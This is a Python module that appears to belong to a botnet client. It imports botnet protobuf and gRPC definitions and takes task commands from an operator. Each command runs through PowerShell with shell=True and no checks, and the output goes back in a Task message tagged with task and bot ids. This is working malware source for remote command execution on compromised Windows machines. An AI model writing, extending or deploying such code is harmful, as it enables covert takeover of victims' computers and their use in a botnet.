import subprocess
from bot.modules import tiempo
from protos.botnet_pb2 import *
from protos.botnet_pb2_grpc import *

def get_encode():
    cmd = subprocess.Popen('%SYSTEMROOT%\System32\WindowsPowerShell\\v1.0\powershell.exe -Command "chcp"', stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
    response = cmd.stdout.read() + cmd.stderr.read()
    responseArray = (str(response)).split(":")
    code = responseArray[1]
    encode = code.split("\\r")
    return (encode[0]).strip()

def execute_ps(command):
    encode = get_encode()
    try:
        cmd = subprocess.Popen(f'%SYSTEMROOT%\System32\WindowsPowerShell\\v1.0\powershell.exe -Command "{command}"', stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
        response = cmd.stdout.read() + cmd.stderr.read()
        response = response.decode(encode)
        return response
    except:
        return ""

def get_cmd(task):
    response = execute_ps(task.command)
    date_finish = tiempo.get_time()
    return Task(task_id=task.task_id, bot_id=task.bot_id, type="CMD", status="OK", date_start=task.date_start, date_finish=date_finish, command=task.command, response=response)
    